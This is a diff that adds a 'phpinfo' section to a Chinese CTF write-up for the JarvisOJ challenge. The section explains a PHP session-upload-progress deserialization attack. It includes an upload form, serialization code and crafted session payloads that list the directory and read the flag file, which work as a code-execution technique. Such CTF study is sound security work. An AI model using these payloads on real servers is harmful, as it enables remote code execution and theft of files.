@@ -258,3 +258,36 @@ python sqlmap.py -u http://web.jarvisoj.com:32787/login.php --data="username=adm
 
 ## phpinfo
 
+- 这个漏洞在这篇文章内有说 [传送门](http://www.91ri.org/15925.html)
+- 理解了这个漏洞就很容易了
+- 构造上传与反序列化
+
+```html
+<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
+  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
+  <input type="file" name="file" />
+  <input type="submit" />
+</form>
+```
+
+```php
+<?php
+class OowoO
+{
+    public $mdzz='?';
+}
+$obj = new OowoO();
+echo serialize($obj);
+?>
+```
+
+- 将问号替换为需要执行的 php 代码
+- 想使用 system 命令，但是失败了，应该是被禁用了？
+- 所以构造 payload : print_r(scandir(dirname(__FILE__)));
+- 序列化后: O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}
+- 为了防止转义，将 " 前加上 \ ，并且开头加上 | (session格式):" |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";} "
+
+- ![phpinfo](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-phpinfo-1.png?raw=true)
+- 接下来读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php，由 phpinfo 可知，当前目录为/opt/lampp/htdocs/
+- 所以，构造 payload: |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}
+- ![phpinfo](https://github.com/Chris-Ju/Picture/blob/master/JarvisOJ-phpinfo-2.png?raw=true)
